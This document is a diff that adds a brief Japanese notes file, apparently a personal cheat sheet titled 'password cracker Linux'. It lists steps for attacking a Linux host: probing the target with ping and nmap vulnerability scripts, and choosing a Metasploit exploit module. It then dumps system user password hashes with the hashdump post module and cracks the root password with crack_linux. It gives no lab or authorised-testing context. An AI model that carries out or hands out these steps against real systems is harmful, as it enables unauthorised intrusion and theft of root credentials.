@@ -1,0 +1,15 @@
+パスワードクラッカー Linux
+1) pingでターゲットホストが稼働しているかどうかを確認する
+2) nmapでセキュリティホールを探索する
+3) nmap --script vuln -p ポート番号 ターゲットドメインでそのポートのサービスがローカルに脆弱性を持つかを調べる
+4) 取得した情報を保存するために、postgresqlを起動する
+service postgresql start
+5) 脆弱性を突く、モジュールをsearchで探して、useで起動して、setで設定を行う
+6) その後、以下のコマンドを使って、システムユーザーのハッシュをダンプする。
+use post/linux/gather/hashdump
+set SESSIONS 1
+exploit
+7) 以下のモジュールを使って、rootユーザーのパスコードを見つける
+use auxiliary/analyze/crack_linux
+set SHA512 true
+run
